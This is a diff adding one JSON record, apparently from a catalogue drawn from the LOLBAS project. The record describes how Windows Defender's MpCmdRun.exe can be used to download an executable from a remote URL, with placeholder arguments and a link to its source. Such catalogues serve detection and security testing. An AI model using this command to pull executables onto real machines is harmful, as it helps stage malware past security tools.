@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-mpcmdrun-exe-download-1",
+  "name": "LOLBAS · MpCmdRun.exe (Download) #1",
+  "command": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}",
+  "description": "Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "mpcmdrun",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/MpCmdRun/",
+  "upstream_id": "MpCmdRun.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — MpCmdRun.exe",
+      "url": "https://lolbas-project.github.io/lolbas/MpCmdRun/"
+    }
+  ]
+}
